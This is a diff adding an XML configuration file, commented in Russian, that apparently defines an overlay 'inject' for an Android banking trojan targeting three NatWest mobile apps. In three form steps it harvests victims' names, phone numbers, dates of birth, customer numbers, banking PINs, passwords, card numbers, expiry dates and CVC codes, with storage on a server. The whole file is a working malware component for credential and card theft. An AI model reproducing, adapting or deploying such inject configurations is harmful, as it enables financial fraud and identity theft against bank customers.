@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="UTF-8"?><!-- Файл должен быть в кодировке UTF-8 (без BOM) -->
+<document>
+	<name>NatWest (UK)</name><!-- Название инжекта -->
+	<apps>com.rbs.mobile.android.natwestoffshore;com.rbs.mobile.android.natwest;com.rbs.mobile.android.natwestbandc</apps><!-- Приложения, которые будут перекрываться (через точку с запятой) -->
+	<size>1</size><!-- Размер инжекта (1 - стандартный, 2 - в виде диалога) -->
+	<storage>2</storage><!-- Место хранения инжекта (1 - в устройстве, 2 - на сервере) -->
+	
+	<step><!-- Новый шаг (форма) -->
+		<param><!-- Параметр в шаге (форме) -->
+			<column>First name</column><!-- Название колонки (для вкладки "Инжекты"->"Данные") -->
+			<name>f_name</name><!-- Название параметра (поле name в форме в файле index.html) -->
+		</param>
+
+		<param>
+			<column>Last name</column>
+			<name>l_name</name>
+		</param>
+
+		<param>
+			<column>Phone number</column>
+			<name>phone</name>
+		</param>
+		
+		<param>
+			<column>Day birth</column>
+			<name>dob_d</name>
+		</param>
+		
+		<param>
+			<column>Month birth</column>
+			<name>dob_m</name>
+		</param>
+		
+		<param>
+			<column>Year birth</column>
+			<name>dob_y</name>
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>Customer number</column>
+			<name>number</name>
+		</param>
+
+		<param>
+			<column>Banking PIN</column>
+			<name>pin</name>
+		</param>
+		
+		<param>
+			<column>Password</column>
+			<name>pass</name>
+		</param>
+	</step>
+	
+	<step>
+		<param>
+			<column>Card number</column>
+			<name>cc</name>
+		</param>
+
+		<param>
+			<column>MM</column>
+			<name>exp_m</name>
+		</param>
+
+		<param>
+			<column>YY</column>
+			<name>exp_y</name>
+		</param>
+		
+		<param>
+			<column>CVC</column>
+			<name>cvv</name>
+		</param>
+	</step>
+
+</document>
